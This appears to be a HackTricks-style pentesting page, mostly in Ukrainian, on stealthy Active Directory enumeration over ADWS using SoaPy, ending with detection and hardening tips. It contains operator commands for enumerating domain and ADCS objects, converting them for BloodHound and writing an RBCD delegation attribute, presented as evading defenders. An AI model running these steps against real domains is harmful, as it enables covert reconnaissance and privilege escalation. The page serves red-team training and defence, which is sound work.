# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Що таке ADWS?

Active Directory Web Services (ADWS) **включено за замовчуванням на кожному контролері домену з Windows Server 2008 R2** і слухає на TCP **9389**. Незважаючи на назву, **HTTP не використовується**. Натомість, служба відкриває дані в стилі LDAP через стек власних протоколів .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсульований всередині цих бінарних SOAP-рамок і проходить через незвичайний порт, **перерахування через ADWS набагато менш імовірно, що буде перевірено, відфільтровано або підписано, ніж класичний трафік LDAP/389 & 636**. Для операторів це означає:

* Менш помітне розвідка – команди Blue часто зосереджуються на запитах LDAP.
* Свобода збору з **не-Windows хостів (Linux, macOS)** шляхом тунелювання 9389/TCP через SOCKS-проксі.
* Ті ж дані, які ви отримали б через LDAP (користувачі, групи, ACL, схема тощо) та можливість виконувати **записи** (наприклад, `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

> ПРИМІТКА: ADWS також використовується багатьма інструментами RSAT GUI/PowerShell, тому трафік може змішуватися з легітимною адміністративною діяльністю.

## SoaPy – Нативний Python-клієнт

[SoaPy](https://github.com/logangoins/soapy) є **повною повторною реалізацією стеку протоколів ADWS на чистому Python**. Він створює рамки NBFX/NBFSE/NNS/NMF байт за байтом, що дозволяє збір даних з Unix-подібних систем без взаємодії з .NET runtime.

### Ключові особливості

* Підтримує **проксіювання через SOCKS** (корисно з C2 імплантами).
* Тонко налаштовані фільтри пошуку, ідентичні LDAP `-q '(objectClass=user)'`.
* Додаткові **операції запису** ( `--set` / `--delete` ).
* **Режим виводу BOFHound** для прямого споживання в BloodHound.
* Параметр `--parse` для форматування часових міток / `userAccountControl`, коли потрібна людська читабельність.

### Встановлення (хост оператора)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Наступний робочий процес показує, як перерахувати **об'єкти домену та ADCS** через ADWS, конвертувати їх у BloodHound JSON та шукати шляхи атак на основі сертифікатів – все це з Linux:

1. **Tunnel 9389/TCP** з цільової мережі на вашу машину (наприклад, через Chisel, Meterpreter, SSH динамічний порт-форвард тощо). Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або використовуйте SoaPy’s `--proxyHost/--proxyPort`.

2. **Зберіть об'єкт кореневого домену:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Збирайте об'єкти, пов'язані з ADCS, з Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Перетворити на BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Завантажте ZIP** в BloodHound GUI та виконайте запити cypher, такі як `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації сертифікатів (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Об'єднайте це з `s4u2proxy`/`Rubeus /getticket` для повного **Resource-Based Constrained Delegation** ланцюга.

## Виявлення та зміцнення

### Докладне ведення журналів ADDS

Увімкніть наступні ключі реєстру на контролерах домену, щоб виявити дорогі / неефективні запити, що надходять з ADWS (та LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Події з'являться під **Directory-Service** з повним LDAP-фільтром, навіть коли запит надійшов через ADWS.

### SACL Canary Objects

1. Створіть фіктивний об'єкт (наприклад, вимкнений користувач `CanaryUser`).
2. Додайте **Audit** ACE для принципала _Everyone_, аудиторія на **ReadProperty**.
3. Коли зловмисник виконує `(servicePrincipalName=*)`, `(objectClass=user)` тощо, DC генерує **Event 4662**, який містить реальний SID користувача – навіть коли запит проксований або походить з ADWS.

Приклад попередньо створеного правила Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Підсумок інструментів

| Мета | Інструмент | Примітки |
|------|------------|----------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, читання/запис |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Конвертує журнали SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Може бути проксійований через той же SOCKS |

## Посилання

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
